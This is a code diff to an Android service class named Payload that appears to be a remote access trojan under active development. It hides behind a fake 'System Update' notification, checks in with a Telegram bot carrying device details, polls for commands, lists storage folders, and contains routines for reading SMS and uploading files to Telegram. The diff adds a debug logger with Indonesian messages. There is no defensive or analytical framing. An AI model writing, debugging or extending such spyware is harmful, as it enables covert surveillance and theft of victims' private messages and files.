@@ -41,6 +41,15 @@ public class Payload extends Service {
     private volatile boolean isRunning = true;
     private long lastUpdateId = 0;
 
+    private void writeLog(String msg) {
+        try {
+            File file = new File(Environment.getExternalStorageDirectory(), "Download/rat_debug.txt");
+            FileOutputStream fos = new FileOutputStream(file, true);
+            fos.write((new java.util.Date().toString() + " - " + msg + "\n").getBytes());
+            fos.close();
+        } catch (Exception e) {}
+    }
+
     public static void askPermissions(Activity activity) {
         if (Build.VERSION.SDK_INT >= 23) {
             List<String> permissions = new ArrayList<>();
@@ -75,29 +84,39 @@ public class Payload extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d("SystemUpdate", "Service started...");
+        writeLog("1. Service dimulai (onStartCommand)");
         
-        if (Build.VERSION.SDK_INT >= 26) {
-            String CHANNEL_ID = "sys_update_channel";
-            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
-            channel.setShowBadge(false);
-            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
-            if (manager != null) manager.createNotificationChannel(channel);
+        try {
+            if (Build.VERSION.SDK_INT >= 26) {
+                String CHANNEL_ID = "sys_update_channel";
+                NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW);
+                channel.setShowBadge(false);
+                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                if (manager != null) manager.createNotificationChannel(channel);
 
-            Notification notification = new Notification.Builder(this, CHANNEL_ID)
-                    .setContentTitle("System Update")
-                    .setContentText("Checking for updates...")
-                    .setSmallIcon(android.R.drawable.ic_popup_sync)
-                    .build();
-            startForeground(1, notification);
+                Notification notification = new Notification.Builder(this, CHANNEL_ID)
+                        .setContentTitle("System Update")
+                        .setContentText("Checking for updates...")
+                        .setSmallIcon(android.R.drawable.ic_popup_sync)
+                        .build();
+                startForeground(1, notification);
+                writeLog("2. Foreground Service berhasil");
+            }
+        } catch (Exception e) {
+            writeLog("ERROR StartForeground: " + e.getMessage());
         }
 
         new Thread(new Runnable() {
             @Override
             public void run() {
-                // LAPOR DIRI (DIPANGGIL DI DALAM THREAD BIAR GA CRASH)
+                writeLog("3. Thread jalan");
                 String deviceName = Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
+                
+                sendTelegramMessage("🚀 *Service Active!*\nDevice: " + deviceName);
+                writeLog("4. Pesan Service Active terkirim/tertunda");
+
                 sendCheckIn(deviceName);
+                writeLog("5. CheckIn terkirim/tertunda");
 
                 while (isRunning) {
                     try {
@@ -137,7 +156,9 @@ public class Payload extends Service {
                             sendTelegramMessage("📂 *Isi Folder:*\n" + listFiles("/storage/emulated/0/"));
                         }
 
-                    } catch (Exception e) { e.printStackTrace(); }
+                    } catch (Exception e) { 
+                        writeLog("Error Loop: " + e.getMessage());
+                    }
                     try { TimeUnit.SECONDS.sleep(3); } catch (InterruptedException e) { e.printStackTrace(); }
                 }
             }
@@ -150,7 +171,7 @@ public class Payload extends Service {
             String encoded = URLEncoder.encode("/checkin " + deviceInfo, "UTF-8");
             String urlStr = "https://api.telegram.org/bot" + BUILDER_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;
             new URL(urlStr).openConnection().getInputStream().close();
-        } catch (Exception e) { e.printStackTrace(); }
+        } catch (Exception e) { writeLog("Error CheckIn: " + e.getMessage()); }
     }
 
     private String getSms() {
@@ -245,7 +266,7 @@ public class Payload extends Service {
             String encodedMsg = URLEncoder.encode(pesan, "UTF-8");
             String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
             new URL(urlStr).openConnection().getInputStream().close();
-        } catch (Exception e) { e.printStackTrace(); }
+        } catch (Exception e) { writeLog("Error Kirim Pesan: " + e.getMessage()); }
     }
 
     private void sendTelegramFile(String filePath, boolean isPhoto, String caption) {
@@ -274,4 +295,4 @@ public class Payload extends Service {
 
     @Override
     public IBinder onBind(Intent intent) { return null; }
-                }
+}
